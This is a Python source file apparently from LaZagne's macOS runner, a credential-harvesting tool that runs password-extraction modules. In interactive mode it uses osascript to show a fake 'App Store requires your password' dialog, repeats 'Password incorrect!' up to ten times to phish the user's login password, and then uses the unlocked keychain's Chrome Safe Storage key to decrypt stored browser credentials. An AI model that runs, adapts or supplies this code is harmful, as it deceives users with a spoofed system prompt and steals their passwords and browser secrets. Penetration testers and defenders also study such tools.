# -*- coding: utf-8 -*-
# !/usr/bin/python
import subprocess
import traceback
import getpass

from lazagne.config.constant import constant
from lazagne.config.write_output import print_debug, StandardOutput
from lazagne.config.manage_modules import get_categories, get_modules
from lazagne.softwares.browsers.chrome import Chrome


def create_module_dic():
    if constant.modules_dic:
        return constant.modules_dic

    modules = {}

    # Define a dictionary for all modules
    for category in get_categories():
        modules[category] = {}

    # Add all modules to the dictionary
    for m in get_modules():
        modules[m.category][m.options['dest']] = m

    constant.modules_dic = modules
    return modules


def get_safe_storage_key(key):
    try:
        for passwords in constant.keychains_pwds:
            if key in passwords['Service']:
                return passwords['Password']
    except Exception:
        pass

    return False


def run_cmd(cmd):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    result, _ = p.communicate()
    if result:
        return result
    else:
        return ''


def run_module(module, subcategories):
    """
    Run only one module
    """
    modules_to_launch = []

    # Launch only a specific module
    for i in subcategories:
        if subcategories[i] and i in module:
            modules_to_launch.append(i)

    # Launch all modules
    if not modules_to_launch:
        modules_to_launch = module

    for i in modules_to_launch:
        try:
            constant.st.title_info(i.capitalize())  # print title
            pwd_found = module[i].run()  # run the module
            constant.st.print_output(i.capitalize(), pwd_found)  # print the results

            # Return value - not used but needed
            yield True, i.capitalize(), pwd_found
        except Exception:
            error_message = traceback.format_exc()
            print_debug('DEBUG', error_message)
            yield False, i.capitalize(), error_message


def run_modules(category_selected, subcategories):
    """
    Run modules
    """
    modules = create_module_dic()
    categories = [category_selected] if category_selected != 'all' else get_categories()
    for category in categories:
        for r in run_module(modules[category], subcategories):
            yield r


def run_lazagne(category_selected='all', subcategories={}, password=None, interactive=False):
    """
    Main function
    """
    if password:
        constant.user_password = password

    if not constant.st:
        constant.st = StandardOutput()

    user = getpass.getuser()
    constant.finalResults = {'User': user}

    # Could be easily changed
    application = 'App Store'

    i = 0
    while True:
        # Run all modules
        for r in run_modules(category_selected, subcategories):
            yield r

        # Execute once if not interactive,
        # Otherwise print the dialog box until the user keychain is unlocked (so the user password has been found)
        if not interactive or (interactive and constant.user_keychain_find):
            break

        elif interactive and not constant.user_keychain_find:
            msg = ''
            if i == 0:
                msg = 'App Store requires your password to continue.'
            else:
                msg = 'Password incorrect! Please try again.'

            # Code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
            cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" ' \
                  'to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & ' \
                  'return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(
                    application=application, msg=msg
            )
            pwd = run_cmd(cmd)
            if pwd.split(':')[1].startswith('OK'):
                constant.user_password = pwd.split(':')[2].strip()

        i += 1

        # If the user enter 10 bad password, be nice with him and break the loop
        if i > 10:
            break

    # If keychains has been decrypted, launch again some module
    chrome_key = get_safe_storage_key('Chrome Safe Storage')
    if chrome_key:
        for r in run_module({'chrome': Chrome(safe_storage_key=chrome_key)}, subcategories):
            yield r

    constant.stdout_result.append(constant.finalResults)